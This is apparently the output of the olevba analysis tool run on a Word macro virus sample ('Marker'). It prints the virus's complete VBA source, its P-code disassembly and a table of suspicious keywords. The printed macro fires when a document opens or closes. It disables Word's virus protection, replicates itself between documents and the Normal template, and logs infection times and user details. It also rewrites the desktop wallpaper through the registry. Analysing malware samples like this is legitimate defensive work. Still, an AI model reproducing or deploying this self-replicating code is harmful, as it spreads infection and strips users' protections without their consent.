olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.dm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.dm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs2000"

Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim EmailMe, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Options.VirusProtection = False
Application.UserName = "fs080298"
Application.UserInitials = "FS2000"
Application.UserAddress = "fs080298@hotmail.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub Sisipin
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
GoSub EmailMePlease
GoTo Finish
Sisipin:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   EmailMe = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For I = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, I, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, I, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, I, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString EmailMe
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    EmailMe = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString EmailMe
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub EmailMePlease
Return
EmailMePlease:
Dim SystemRoot As String
On Error Resume Next
 SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open SystemRoot & "\EmailMe.html" For Output As #1
 Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
 Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
 Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
 Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
 Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
 Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
 Print #1, "<p><br><br><br><br><br></p>"
 Print #1, "<p align='right'><a href='mailto:fs080298@hotmail.com'><font size='2'>Email Me !</font></a></p></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
Return
Finish:
End Sub
'Thank for looking my wallpaper
'Logfile -->

' 05:44:375:44:37 PM PM-Friday, 5 Nov 1999
' fs080298
' fs080298@hotmail.com

 


' 08:44:418:44:41 PM PM-Monday, 1 Nov 1999
' fs080298
' fs080298@hotmail.com

 


' 08:00:138:00:13 -Selasa, 16 Nop 1999
' fs080298
' fs080298@hotmail.com

 


' 07:23:5519:23:55 -Sabtu, 20 Nop 1999
' fs080298
' fs080298@hotmail.com

 


' 09:08:521:08:05 -Selasa, 23 Nop 1999
' fs080298
' fs080298@hotmail.com

 


' 12:57:1612:57:16 PM PM-Thursday, 9 Dec 1999
' fs080298
' fs080298@hotmail.com

 


' 11:10:2211:10:22 AM AM-Thursday, 16 Dec 1999
' fs080298
' fs080298@hotmail.com

 


' 02:08:382:08:38 PM PM-Saturday, 13 Nov 1999
' fs080298
' fs080298@hotmail.com

 


' 05:58:285:58:28 PM PM-Thursday, 3 Feb 2000
' fs080298
' fs080298@hotmail.com

 


' 05:04:295:04:29 PM PM-Thursday, 17 Feb 2000
' fs080298
' fs080298@hotmail.com

 


' 08:52:98:52:09 PM PM-Wednesday, 1 Mar 2000
' fs080298
' fs080298@hotmail.com

 


' 08:35:228:35:22 PM PM-Tuesday, 7 Mar 2000
' fs080298
' fs080298@hotmail.com

 


' 11:27:111:27:01 AM AM-Thursday, 16 Mar 2000
' fs080298
' fs080298@hotmail.com

 


' 08:14:408:14:40 AM AM-Friday, 9 Jun 2000
' fs080298
' fs080298@hotmail.com

 


' 05:27:335:27:33 AM AM-Monday, 26 Jun 2000
' fs080298
' fs080298@hotmail.com

 


' 10:52:5810:52:58 AM AM-Thursday, 29 Jun 2000
' fs080298
' fs080298@hotmail.com

 


' 08:46:588:46:58 PM PM-Tuesday, 5 Sep 2000
' fs080298
' fs080298@hotmail.com

 


' 12:03:3612:03:36 AM AM-Friday, 4 Jan 1980
' fs080298
' fs080298@hotmail.com

 


' 11:04:3311:04:33 AM AM-Tuesday, 5 Dec 2000
' fs080298
' fs080298@hotmail.com

 


' 11:48:5111:48:51 AM AM-Thursday, 25 Jan 2001
' fs080298
' fs080298@hotmail.com

 


' 09:38:489:38:48 AM AM-Wednesday, 14 Feb 2001
' fs080298
' fs080298@hotmail.com

 


' 11:45:2611:45:26 AM AM-Thursday, 15 Feb 2001
' fs080298
' fs080298@hotmail.com

 


' 03:04:213:04:21 PM PM-Wednesday, 9 May 2001
' fs080298
' fs080298@hotmail.com

 


' 08:21:388:21:38 PM PM-Sunday, 13 May 2001
' fs080298
' fs080298@hotmail.com

 


' 06:34:96:34:09 AM AM-Monday, 9 Jul 2001
' fs080298
' fs080298@hotmail.com

 


' 02:25:4914:25:49  PM-Monday, 10 Sep 2001
' fs080298
' fs080298@hotmail.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.dm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12802 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0014 "Son, Be a Good Boy !"
' Line #2:
' 	Dim (Const) 
' 	LitStr 0x001E "<- this is a marker! by fs2000"
' 	VarDefn Marker
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	ArgsCall Document_Close 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #9:
' 	Dim 
' 	VarDefn isd (As String)
' Line #10:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn EmailMe
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitStr 0x0008 "fs080298"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0006 "FS2000"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0014 "fs080298@hotmail.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	GoSub Sisipin 
' Line #20:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #21:
' 	GoSub EmailMePlease 
' Line #22:
' 	GoTo Finish 
' Line #23:
' 	Label Sisipin 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #26:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #27:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #28:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld DI 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #32:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #33:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld EmailMe 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St EmailMe 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	Ld EmailMe 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld NTI 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld EmailMe 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Return 
' Line #55:
' 	Label LoggingIn 
' Line #56:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #57:
' 	GoSub EmailMePlease 
' Line #58:
' 	Return 
' Line #59:
' 	Label EmailMePlease 
' Line #60:
' 	Dim 
' 	VarDefn SystemRoot (As String)
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SystemRoot 
' Line #63:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B0 "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00C6 "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006E "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "<p><br><br><br><br><br></p>"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006D "<p align='right'><a href='mailto:fs080298@hotmail.com'><font size='2'>Email Me !</font></a></p></Body></html>"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	Return 
' Line #75:
' 	Label Finish 
' Line #76:
' 	EndSub 
' Line #77:
' 	QuoteRem 0x0000 0x001E "Thank for looking my wallpaper"
' Line #78:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #79:
' Line #80:
' 	QuoteRem 0x0000 0x0029 " 05:44:375:44:37 PM PM-Friday, 5 Nov 1999"
' Line #81:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #82:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' 	QuoteRem 0x0000 0x0029 " 08:44:418:44:41 PM PM-Monday, 1 Nov 1999"
' Line #88:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #89:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' 	QuoteRem 0x0000 0x0025 " 08:00:138:00:13 -Selasa, 16 Nop 1999"
' Line #95:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #96:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' 	QuoteRem 0x0000 0x0025 " 07:23:5519:23:55 -Sabtu, 20 Nop 1999"
' Line #102:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #103:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' 	QuoteRem 0x0000 0x0025 " 09:08:521:08:05 -Selasa, 23 Nop 1999"
' Line #109:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #110:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x002C " 12:57:1612:57:16 PM PM-Thursday, 9 Dec 1999"
' Line #116:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #117:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x002D " 11:10:2211:10:22 AM AM-Thursday, 16 Dec 1999"
' Line #123:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #124:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' 	QuoteRem 0x0000 0x002C " 02:08:382:08:38 PM PM-Saturday, 13 Nov 1999"
' Line #130:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #131:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' 	QuoteRem 0x0000 0x002B " 05:58:285:58:28 PM PM-Thursday, 3 Feb 2000"
' Line #137:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #138:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x002C " 05:04:295:04:29 PM PM-Thursday, 17 Feb 2000"
' Line #144:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #145:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' 	QuoteRem 0x0000 0x002B " 08:52:98:52:09 PM PM-Wednesday, 1 Mar 2000"
' Line #151:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #152:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x002A " 08:35:228:35:22 PM PM-Tuesday, 7 Mar 2000"
' Line #158:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #159:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' 	QuoteRem 0x0000 0x002C " 11:27:111:27:01 AM AM-Thursday, 16 Mar 2000"
' Line #165:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #166:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0029 " 08:14:408:14:40 AM AM-Friday, 9 Jun 2000"
' Line #172:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #173:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x002A " 05:27:335:27:33 AM AM-Monday, 26 Jun 2000"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #180:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' 	QuoteRem 0x0000 0x002D " 10:52:5810:52:58 AM AM-Thursday, 29 Jun 2000"
' Line #186:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #187:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x002A " 08:46:588:46:58 PM PM-Tuesday, 5 Sep 2000"
' Line #193:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #194:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x002A " 12:03:3612:03:36 AM AM-Friday, 4 Jan 1980"
' Line #200:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #201:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x002B " 11:04:3311:04:33 AM AM-Tuesday, 5 Dec 2000"
' Line #207:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #208:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x002D " 11:48:5111:48:51 AM AM-Thursday, 25 Jan 2001"
' Line #214:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #215:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x002D " 09:38:489:38:48 AM AM-Wednesday, 14 Feb 2001"
' Line #221:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #222:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x002D " 11:45:2611:45:26 AM AM-Thursday, 15 Feb 2001"
' Line #228:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #229:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x002C " 03:04:213:04:21 PM PM-Wednesday, 9 May 2001"
' Line #235:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #236:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' 	QuoteRem 0x0000 0x002A " 08:21:388:21:38 PM PM-Sunday, 13 May 2001"
' Line #242:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #243:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0028 " 06:34:96:34:09 AM AM-Monday, 9 Jul 2001"
' Line #249:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #250:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' 	QuoteRem 0x0000 0x0029 " 02:25:4914:25:49  PM-Monday, 10 Sep 2001"
' Line #256:
' 	QuoteRem 0x0000 0x0009 " fs080298"
' Line #257:
' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
' Line #258:
' Line #259:
' Line #260:
' Line #261:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

